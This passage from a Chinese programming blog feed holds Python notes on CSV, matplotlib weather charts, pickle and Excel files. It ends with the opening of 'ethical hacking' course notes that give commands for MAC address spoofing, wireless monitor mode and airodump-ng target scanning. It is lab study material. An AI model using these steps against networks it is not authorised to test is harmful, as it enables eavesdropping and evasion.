class="line">listd=[&#123;&#x27;name&#x27;:&#x27;a&#x27;,&#x27;age&#x27;:&#x27;18&#x27;,&#x27;high&#x27;:&#x27;100&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;b&#x27;,&#x27;age&#x27;:&#x27;14&#x27;,&#x27;high&#x27;:&#x27;200&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;c&#x27;,&#x27;age&#x27;:&#x27;16&#x27;,&#x27;high&#x27;:&#x27;150&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;d&#x27;,&#x27;age&#x27;:&#x27;19&#x27;,&#x27;high&#x27;:&#x27;300&#x27;&#125;]</span><br><span class="line">listh=[&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;]</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.DictWriter(file,fieldnames=listh)</span><br><span class="line">    writefile.writeheader()</span><br><span class="line">    for data in listd:</span><br><span class="line">        writefile.writerow(data)</span><br></pre></td></tr></table></figure><blockquote><p>writerows寫法:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_11_3.csv&#x27;</span><br><span class="line">listd=[&#123;&#x27;name&#x27;:&#x27;a&#x27;,&#x27;age&#x27;:&#x27;18&#x27;,&#x27;high&#x27;:&#x27;100&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;b&#x27;,&#x27;age&#x27;:&#x27;14&#x27;,&#x27;high&#x27;:&#x27;200&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;c&#x27;,&#x27;age&#x27;:&#x27;16&#x27;,&#x27;high&#x27;:&#x27;150&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;d&#x27;,&#x27;age&#x27;:&#x27;19&#x27;,&#x27;high&#x27;:&#x27;300&#x27;&#125;]</span><br><span class="line">listh=[&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;]</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.DictWriter(file,fieldnames=listh)</span><br><span class="line">    writefile.writeheader()</span><br><span class="line">    writefile.writerows(listd)</span><br></pre></td></tr></table></figure><blockquote><p>中文寫法:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_11_4.csv&#x27;</span><br><span class="line">listd=[&#123;&#x27;名字&#x27;:&#x27;小名&#x27;,&#x27;年齡&#x27;:&#x27;20&#x27;,&#x27;身高&#x27;:&#x27;100&#x27;&#125;,&#123;&#x27;名字&#x27;:&#x27;小華&#x27;,&#x27;年齡&#x27;:&#x27;21&#x27;,&#x27;身高&#x27;:&#x27;150&#x27;&#125;,&#123;&#x27;名字&#x27;:&#x27;小立&#x27;,&#x27;年齡&#x27;:&#x27;22&#x27;,&#x27;身高&#x27;:&#x27;200&#x27;&#125;]</span><br><span class="line">listh=[&#x27;名字&#x27;,&#x27;年齡&#x27;,&#x27;身高&#x27;]</span><br><span class="line">with open(fn,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.DictWriter(file,fieldnames=listh)</span><br><span class="line">    writefile.writeheader()</span><br><span class="line">    for data in listd:</span><br><span class="line">        writefile.writerow(data)</span><br></pre></td></tr></table></figure><blockquote><p>中文讀取:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_11_4.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">    datas=csv.DictReader(file)</span><br><span class="line">    for data in datas:</span><br><span class="line">        print(data)</span><br></pre></td></tr></table></figure><h4 id="csv專案-使用csv繪製氣象圖表"><a href="#csv專案-使用csv繪製氣象圖表" class="headerlink" title="csv專案(使用csv繪製氣象圖表)"></a>csv專案(使用csv繪製氣象圖表)</h4><blockquote><p>讀取檔案資料(標題):</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    print(header)</span><br></pre></td></tr></table></figure><blockquote><p>列出標題相對索引</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    heard=next(datas)</span><br><span class="line">    for data in enumerate(heard):</span><br><span class="line">        print(data)</span><br><span class="line">    for n,d in enumerate(heard):</span><br><span class="line">        print(n,d)</span><br></pre></td></tr></table></figure><blockquote><p>讀取最高溫和最低溫</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    heard=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    highTemps=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(data[3])</span><br><span class="line">        highTemps.append(data[1])</span><br><span class="line">print(&#x27;高溫:&#x27;,highTemps)</span><br><span class="line">print(&#x27;低溫:&#x27;,lowTemps)</span><br></pre></td></tr></table></figure><blockquote><p>繪製最低溫圖</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(int(data[3]))</span><br><span class="line">plt.plot(lowTemps)</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=14)</span><br><span class="line">plt.ylabel(&#x27;Temperature(c)&#x27;,fontsize=14)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=12,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>設定繪圖區大小</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(int(data[3]))</span><br><span class="line">plt.figure(dpi=80,figsize=(12,15)) #長:80*12 寬:80*15 </span><br><span class="line">plt.plot(lowTemps)</span><br><span class="line">plt.title(&quot;Weather Report, Jan. 2017&quot;,fontsize=24)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>日期格式</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">date=datetime.strptime(&#x27;2024/02/05 20:30:30&#x27;,&#x27;%Y/%m/%d %H:%M:%S&#x27;)</span><br><span class="line">print(date)</span><br></pre></td></tr></table></figure><blockquote><p>在圖表上加入日期格式</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    date=[]</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(int(data[3]))</span><br><span class="line">        date.append(datetime.strptime(data[0],&#x27;%Y/%m/%d&#x27;))</span><br><span class="line">plt.figure(dpi=80,figsize=(12,8))</span><br><span class="line">plt.plot(date,lowTemps)</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>日期旋轉</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    date=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(int(data[3]))</span><br><span class="line">        date.append(datetime.strptime(data[0],&#x27;%Y/%m/%d&#x27;))</span><br><span class="line">fig=plt.figure(dpi=80,figsize=(12,8))</span><br><span class="line">plt.plot(date,lowTemps)</span><br><span class="line">fig.autofmt_xdate() #可用rotation=n 來設定度數</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>繪製高低溫圖</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    highTemps=[]</span><br><span class="line">    date=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        try:</span><br><span class="line">            a=int(data[3])</span><br><span class="line">            b=int(data[1])</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;有缺值&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            lowTemps.append(a)</span><br><span class="line">            highTemps.append(b)</span><br><span class="line">            date.append(datetime.strptime(data[0],&#x27;%Y/%m/%d&#x27;))</span><br><span class="line">fig=plt.figure(dpi=80,figsize=(12,8))</span><br><span class="line">plt.plot(date,highTemps,color=&#x27;r&#x27;)</span><br><span class="line">plt.plot(date,lowTemps,color=&#x27;b&#x27;)</span><br><span class="line">fig.autofmt_xdate(rotation=60)</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24,color=&#x27;b&#x27;)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>填滿中間區塊</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    highTemps=[]</span><br><span class="line">    date=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        try:</span><br><span class="line">            a=int(data[3])</span><br><span class="line">            b=int(data[1])</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;有缺值&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            lowTemps.append(a)</span><br><span class="line">            highTemps.append(b)</span><br><span class="line">            date.append(datetime.strptime(data[0],&#x27;%Y/%m/%d&#x27;))</span><br><span class="line">fig=plt.figure(dpi=80,figsize=(12,8))</span><br><span class="line">plt.plot(date,highTemps,color=&#x27;r&#x27;)</span><br><span class="line">plt.plot(date,lowTemps,color=&#x27;b&#x27;)</span><br><span class="line">plt.fill_between(date,highTemps,lowTemps,color=&#x27;y&#x27;,alpha=0.1) #alpha透明度0.1</span><br><span class="line">fig.autofmt_xdate(rotation=60)</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24,color=&#x27;b&#x27;)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a><strong>pickle</strong></h3><blockquote><p>寫入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;name&#x27;:&#x27;a&#x27;,</span><br><span class="line">    &#x27;age&#x27;:&#x27;20&#x27;,</span><br><span class="line">    &#x27;high&#x27;:200,</span><br><span class="line">    &#x27;data&#x27;:[1,2,3,4,5,6,67]</span><br><span class="line">&#125;</span><br><span class="line">fn=&#x27;ch2_23_2.dat&#x27;</span><br><span class="line">with open(fn,&#x27;wb&#x27;) as file:</span><br><span class="line">    pickle.dump(data,file)</span><br></pre></td></tr></table></figure><blockquote><p>讀取</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">fn=&#x27;ch2_23_2.dat&#x27;</span><br><span class="line">with open(fn,&#x27;rb&#x27;) as file:</span><br><span class="line">    datas=pickle.load(file)</span><br><span class="line">    print(datas)</span><br><span class="line">    print(datas[&#x27;data&#x27;][2])</span><br></pre></td></tr></table></figure><h3 id="python與Microsoft-Excel"><a href="#python與Microsoft-Excel" class="headerlink" title="python與Microsoft Excel"></a><strong>python與Microsoft Excel</strong></h3><h4 id="安裝模組"><a href="#安裝模組" class="headerlink" title="安裝模組"></a>安裝模組</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install xlwt</span><br></pre></td></tr></table></figure><h4 id="基本功能-寫入"><a href="#基本功能-寫入" class="headerlink" title="基本功能(寫入)"></a>基本功能(寫入)</h4><blockquote><p>建立活頁簿</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">活頁簿物件=xlwt.Workbook</span><br></pre></td></tr></table></figure><blockquote><p>建立工作表</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工作物件=活頁簿物件.add_sheet(sheet,cell_overwrite_ok=True)   #第二個參數為True，表示可以重設Excel的儲存格內容</span><br></pre></td></tr></table></figure><blockquote><p>將資料寫入儲存格</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工作物件.write(row,col,data)   #將data寫入(row,col)位置</span><br></pre></td></tr></table></figure><h4 id="實作-寫入"><a href="#實作-寫入" class="headerlink" title="實作(寫入)"></a>實作(寫入)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import xlwt</span><br><span class="line">fn=&#x27;out2_25_2.xls&#x27;</span><br><span class="line">data=[&#x27;iphone 13&#x27;,&#x27;iphone 14&#x27;,&#x27;iphone 15&#x27;]</span><br><span class="line">price=[&#x27;10000&#x27;,&#x27;20000&#x27;,&#x27;30000&#x27;]</span><br><span class="line">excel=xlwt.Workbook()</span><br><span class="line">sh=excel.add_sheet(&#x27;phone&#x27;,cell_overwrite_ok=True)</span><br><span class="line">for i in range(len(data)):</span><br><span class="line">    sh.write(0,i,data[i])</span><br><span class="line">for j in range(len(price)):</span><br><span class="line">    sh.write(1,j,price[j])</span><br><span class="line">excel.save(fn)</span><br></pre></td></tr></table></figure><h4 id="基本功能-讀取"><a href="#基本功能-讀取" class="headerlink" title="基本功能(讀取)"></a>基本功能(讀取)</h4><blockquote><p>開啟excel檔案供讀取</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">活頁簿件=xlrd.open.workbook()</span><br></pre></td></tr></table></figure><blockquote><p>建立工作物件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工作物件=活頁簿物件.sheet()[index]   #上述傳回指定工作表的物件</span><br></pre></td></tr></table></figure><blockquote><p>傳回工作表row數</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">row=工作表物件.nrows</span><br></pre></td></tr></table></figure><blockquote><p>傳回工作表的col數</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cols=工作表物件.ncols</span><br></pre></td></tr></table></figure><blockquote><p>讀取某rows的數據</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list_data=工作表物件.row_valies(rows)  #將指定工作表的rows的值已串列格式回傳給list_data</span><br></pre></td></tr></table></figure><h4 id="實作-讀取"><a href="#實作-讀取" class="headerlink" title="實作(讀取)"></a>實作(讀取)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import xlrd</span><br><span class="line"></span><br><span class="line">fn=&#x27;out2_25_2.xls&#x27;</span><br><span class="line">excel=xlrd.open_workbook(fn)</span><br><span class="line">sh=excel.sheets()[0]</span><br><span class="line">n=sh.nrows</span><br><span class="line">for i in range(n):</span><br><span class="line">    print(sh.row_values(i))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python網路爬蟲 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 筆記 </tag>
            
            <tag> python </tag>
            
            <tag> 網路爬蟲 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Learn Ethical Hacking From Scratch</title>
      <link href="/2024/01/25/Ethical%20Hacking/"/>
      <url>/2024/01/25/Ethical%20Hacking/</url>
      
        <content type="html"><![CDATA[<h1 id="Learn-Ethical-Hacking-From-Scratch"><a href="#Learn-Ethical-Hacking-From-Scratch" class="headerlink" title="Learn Ethical Hacking From Scratch"></a>Learn Ethical Hacking From Scratch</h1><h2 id="Setting-Up-The-Lab"><a href="#Setting-Up-The-Lab" class="headerlink" title="Setting Up The Lab"></a><strong>Setting Up The Lab</strong></h2><h3 id="資源安裝連結"><a href="#資源安裝連結" class="headerlink" title="資源安裝連結"></a><strong>資源安裝連結</strong></h3><h4 id="Kali-linux下載"><a href="#Kali-linux下載" class="headerlink" title="Kali linux下載"></a><strong>Kali linux下載</strong></h4><blockquote><p>下載連結: <a href="https://zsecurity.org/download-custom-kali/">https://zsecurity.org/download-custom-kali/</a></p></blockquote><h4 id="Kali-linux更新指令"><a href="#Kali-linux更新指令" class="headerlink" title="Kali linux更新指令"></a><strong>Kali linux更新指令</strong></h4><blockquote><p>資料庫更新指令:apt-get update<br>軟體更新指令:apt-get install &lt;terminator&gt;</p></blockquote><h4 id="Kali-linux指令相關網站"><a href="#Kali-linux指令相關網站" class="headerlink" title="Kali linux指令相關網站"></a><strong>Kali linux指令相關網站</strong></h4><blockquote><p>常用指令集: <a href="https://www.mediacollege.com/linux/command/linux-command.html">Linux Commands</a><br>用法解說網站: <a href="https://explainshell.com/">explainshell.com</a></p></blockquote><h2 id="Network-Basices"><a href="#Network-Basices" class="headerlink" title="Network Basices"></a><strong>Network Basices</strong></h2><h3 id="課程所需網卡推薦"><a href="#課程所需網卡推薦" class="headerlink" title="課程所需網卡推薦"></a><strong>課程所需網卡推薦</strong></h3><h4 id="Kali-linux監聽功能網卡推薦"><a href="#Kali-linux監聽功能網卡推薦" class="headerlink" title="Kali linux監聽功能網卡推薦"></a><strong>Kali linux監聽功能網卡推薦</strong></h4><iframe width="560" height="315" src="https://www.youtube.com/embed/0lqRZ3MWPXY?si=Uo1r7Y8PKW3DjRuq" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><h4 id="Kali-linux監聽功能網卡商店"><a href="#Kali-linux監聽功能網卡商店" class="headerlink" title="Kali linux監聽功能網卡商店"></a><strong>Kali linux監聽功能網卡商店</strong></h4><blockquote><p>網址: <a href="https://zsecurity.org/shop/">zsecurity shop</a></p></blockquote><h3 id="網卡設定"><a href="#網卡設定" class="headerlink" title="網卡設定"></a><strong>網卡設定</strong></h3><h4 id="查詢網路介面資訊"><a href="#查詢網路介面資訊" class="headerlink" title="查詢網路介面資訊"></a><strong>查詢網路介面資訊</strong></h4><blockquote><p>指令: ifconfig<br>只查看無線接口指令: iwconfig</p></blockquote><h4 id="查詢無線網路網卡"><a href="#查詢無線網路網卡" class="headerlink" title="查詢無線網路網卡"></a><strong>查詢無線網路網卡</strong></h4><blockquote><p>指令: iwconfig</p></blockquote><h4 id="更改MAC網卡位置"><a href="#更改MAC網卡位置" class="headerlink" title="更改MAC網卡位置"></a><strong>更改MAC網卡位置</strong></h4><blockquote><p>step 1: ifconfig wlan0 down<br>step 2: ifconfig wlan0 hw ether 00:11:22:33:44:55<br>step 3: ifconfig wlan0 up</p></blockquote><h4 id="啟用網卡監聽模式"><a href="#啟用網卡監聽模式" class="headerlink" title="啟用網卡監聽模式"></a><strong>啟用網卡監聽模式</strong></h4><blockquote><p>step 1: ifconfig wlan0 down<br>step 2: airmon-ng check kill (停止網路管理器運行程序)<br>step 3: iwconfig wlan0 mode monitor<br>step 4: ifconfig wlan0 up</p></blockquote><h4 id="啟用網卡監聽模式-其他方法"><a href="#啟用網卡監聽模式-其他方法" class="headerlink" title="啟用網卡監聽模式(其他方法)"></a><strong>啟用網卡監聽模式(其他方法)</strong></h4><iframe width="560" height="315" src="https://www.youtube.com/embed/wiIoR_0epvs?si=Fm4LygIfdqSBlcvB" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><blockquote><p><strong>note:</strong></p><ol><li>網卡的MAC位置設定建議開頭為00</li><li>手動更卡網卡位置在重新開機時將還原</li></ol></blockquote><h2 id="Pre-Connection-Attacks"><a href="#Pre-Connection-Attacks" class="headerlink" title="Pre-Connection Attacks"></a><strong>Pre-Connection Attacks</strong></h2><h3 id="監聽取得封包"><a href="#監聽取得封包" class="headerlink" title="監聽取得封包"></a><strong>監聽取得封包</strong></h3><h4 id="選擇尋找目標"><a href="#選擇尋找目標" class="headerlink" title="選擇尋找目標"></a><strong>選擇尋找目標</strong></h4><blockquote><p>指令(不包含5G頻段網路): airodump-ng &lt;wlan0&gt;<br>指令(5G頻段網路，a頻段) : airodump-ng –band a &lt;wlan0&gt;<br>指令(混和頻段網路) : airodump-ng –band abg 